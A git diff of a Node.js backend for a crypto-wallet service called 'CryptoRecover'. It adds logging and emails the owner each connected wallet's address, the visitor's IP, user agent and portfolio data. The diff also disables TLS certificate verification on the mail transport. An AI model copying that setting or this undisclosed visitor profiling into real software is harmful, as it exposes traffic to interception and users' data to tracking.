@@ -16,20 +16,30 @@ const emailTransporter = nodemailer.createTransport({
   auth: {
     user: process.env.OWNER_EMAIL,
     pass: process.env.EMAIL_PASSWORD
-  }
+  },
+  tls: {
+    rejectUnauthorized: false
+  },
+  connectionTimeout: 10000,
+  greetingTimeout: 5000,
+  socketTimeout: 10000
 });
 
 // Send admin notification
 async function sendAdminNotification(subject, message) {
   try {
-    await emailTransporter.sendMail({
-      from: process.env.OWNER_EMAIL,
+    console.log('Sending admin notification:', subject);
+    const result = await emailTransporter.sendMail({
+      from: `CryptoRecover <${process.env.OWNER_EMAIL}>`,
       to: process.env.OWNER_EMAIL,
       subject: subject,
       text: message
     });
+    console.log('✅ Admin notification sent successfully:', result.messageId);
+    return true;
   } catch (error) {
-    console.log('Email notification failed:', error.message);
+    console.error('❌ Email notification failed:', error.message);
+    return false;
   }
 }
 
@@ -138,18 +148,21 @@ router.post('/connect-wallet', async (req, res) => {
         });
         
         // Send admin notification for new wallet connections
-        console.log('Sending wallet connection email notification...');
-        await sendAdminNotification(
+        const portfolioData = await getQuickPortfolioScan(walletAddress);
+        const emailSent = await sendAdminNotification(
           `🔗 New Wallet Connected - ${walletAddress}`,
           `New user connected wallet: ${walletAddress}\nIP: ${req.ip}\nUser Agent: ${req.headers['user-agent']}\nTime: ${new Date().toISOString()}\n\nPortfolio Data: ${JSON.stringify(portfolioData, null, 2)}`
         );
-        console.log('Wallet connection email sent successfully');
+        if (emailSent) {
+          console.log('✅ Wallet connection email sent successfully');
+        } else {
+          console.log('❌ Wallet connection email failed');
+        }
       } catch (analyticsError) {
         console.log('Analytics/Email error (non-critical):', analyticsError.message);
       }
 
-      // Quick portfolio scan on connection
-      const portfolioData = await getQuickPortfolioScan(walletAddress);
+      // Portfolio data already scanned above for email
       
       res.json({
         success: true,
